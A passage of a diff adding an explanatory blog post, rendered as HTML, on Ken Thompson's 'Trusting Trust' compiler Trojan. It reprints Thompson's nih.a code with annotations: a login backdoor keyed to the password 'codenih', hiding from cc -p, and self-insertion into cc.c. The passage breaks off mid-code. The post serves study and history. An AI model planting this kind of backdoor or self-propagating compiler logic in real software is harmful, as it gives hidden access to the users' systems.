+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>n<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>v<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\v</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-terminator z-c">;</span>  <span class="z-comment z-line z-double-slash z-c"><span class="z-punctuation z-definition z-comment z-c">//</span> New: vertical tab
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>But there's a problem: the current compiler doesn't understand <code>\v</code> yet, so this
+source code won't compile— we need to "train" the compiler first.</p>
+<p>The solution is to temporarily use the actual character code (11 for vertical
+tab in ASCII):</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Figure 2.3 - Training the compiler <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c">c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c"><span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\\</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>n<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>v<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">11</span><span class="z-punctuation z-terminator z-c">;</span>  <span class="z-comment z-line z-double-slash z-c"><span class="z-punctuation z-definition z-comment z-c">//</span> Temporarily use the numeric code
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>This version compiles successfully with the old compiler. Once we compile and
+install this new binary as the official C compiler, it now "knows" what <code>\v</code>
+means. We can then go back and rewrite the code using the portable <code>'\v'</code> form
+(Figure 2.2), and the new compiler will accept it.</p>
+<p>As Thompson notes:</p>
+<blockquote>
+<p>This is a deep concept. It is as close to a "learning" program as I have seen.
+You simply tell it once, then you can use this self-referencing definition.</p>
+</blockquote>
+<p>This self-referencing property is key to understanding how the Trojan horse
+works: once the compiler is "taught" something malicious, it can perpetuate that
+knowledge even after the evidence is removed from the source code.</p>
+<h3 id="stage-iii-slipping-in-the-trojan-horse"><a class="zola-anchor" href="#stage-iii-slipping-in-the-trojan-horse" aria-label="Anchor link for: stage-iii-slipping-in-the-trojan-horse">Stage III: Slipping in the Trojan Horse</a></h3>
+<p>So now we have arrived to the actual Trojan horse logic. The idea of a Trojan
+horse predates Thompson's original work on C by at least a few years, with
+Thompson saying in the paper that he originally read about such an attack in "an
+Air Force critique of the security of an early implementation of
+Multics."<sup class="footnote-reference"><a href="#4">4</a></sup>,<sup class="footnote-reference"><a href="#5">5</a></sup></p>
+<p>Thompson's paper presents the concept in pseudocode:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Figure 3.2 - Simple Trojan horse concept <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c"><span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">compile</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">s</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span>
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>s<span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-comment z-line z-double-slash z-c"><span class="z-punctuation z-definition z-comment z-c">//</span> Trojan horse
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">match</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">s<span class="z-punctuation z-separator z-c">,</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>pattern<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">compile</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>bug<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-flow z-return z-c">return</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">  <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-comment z-line z-double-slash z-c"><span class="z-punctuation z-definition z-comment z-c">//</span> ...
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>But here's the actual implementation from Thompson's <code>nih.a</code> file, with
+annotations by Russ Cox (I highly recommend seeing his article for a more
+detailed step-through of the code, as well as following along with his <a href="https://research.swtch.com/v6/">Unix
+simulator</a>):<sup class="footnote-reference"><a href="#2">2</a></sup></p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Declare the global variable nihflg, of implied type int. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c">nihflg<span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Define the function codenih, with implied return type int and no arguments.
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">   The compiler will be modified to call codenih during preprocessing,
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">   for each input line. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c"><span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">codenih</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span>
+</span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>p<span class="z-punctuation z-separator z-c">,</span> <span class="z-keyword z-operator z-c">*</span>s<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-storage z-type z-c">int</span> i<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> cc -p prints the preprocessor output instead of invoking the
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       compiler back end. To avoid discovery, do nothing when -p is used.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       The implied return type of codenih is int, but early C allowed
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       omitting the return value. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>pflag<span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-flow z-return z-c">return</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Skip leading tabs in the line. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    p <span class="z-keyword z-operator z-assignment z-c">=</span> line<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">while</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-c">*</span>p <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\t</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        p<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Look for the line &quot;namep = crypt(pwbuf);&quot; from login.c.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       If not found, jump to l1. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>namep = crypt(pwbuf);<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> i <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">21</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-comparison z-c">!=</span> p<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l1<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Define login backdoor code s, which does:
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       Check for the password &quot;codenih&quot;.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       If found, modify namep and np so that the code that follows
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       in login.c will accept the password. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    p <span class="z-keyword z-operator z-assignment z-c">=</span><span class="z-keyword z-operator z-arithmetic z-c">+</span> i<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>for(c=0;c&lt;8;c++)<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>if(<span class="z-constant z-character z-escape z-c">\&quot;</span>codenih<span class="z-constant z-character z-escape z-c">\&quot;</span>[c]!=pwbuf[c])goto x1x;<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>while(*namep)namep++;<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>while(*np!=&#39;:&#39;)np++;x1x:<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> With the p=+i from above, this is: strcpy(p+i, s); return;,
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       appending the backdoor to the line.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       In early C, += was spelled =+.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       The loop is strcpy, and goto l4 jumps to the end of the function. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-arithmetic z-c">!</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-c">*</span>p<span class="z-keyword z-operator z-arithmetic z-c">++</span> <span class="z-keyword z-operator z-assignment z-c">=</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-break z-c">break</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> No match for login code. Next target:
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       the distinctive line &quot;av[4] = &quot;-P&quot;;&quot; from cc.c.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       If not found, jump to l2. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-entity z-name z-label z-c">l1</span><span class="z-punctuation z-separator z-c">:</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>av[4] = <span class="z-constant z-character z-escape z-c">\&quot;</span>-P<span class="z-constant z-character z-escape z-c">\&quot;</span>;<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> i <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">13</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-comparison z-c">!=</span> p<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l2<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Increment nihflg to 1 to remember evidence of being in cc.c,
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       and return. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    nihflg<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Next target: input reading loop in cc.c,
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       but only if we&#39;ve seen the av[4] line too:
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       the text &quot;while(getline()) {&quot; is too generic and may be
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       in other programs. If not found, jump to l3. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-entity z-name z-label z-c">l2</span><span class="z-punctuation z-separator z-c">:</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>nihflg <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">1</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l3<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>while(getline()) {<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> i <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">18</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-comparison z-c">!=</span> p<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">            <span class="z-keyword z-control z-flow z-goto z-c">goto</span> l3<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Append input-reading backdoor: call codenih
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       (this very code!) after reading each line.
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-comment z-block z-c">       Increment nihflg to 2 to move to next state. <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    p <span class="z-keyword z-operator z-assignment z-c">=</span><span class="z-keyword z-operator z-arithmetic z-c">+</span> i<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    s <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>codenih();<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
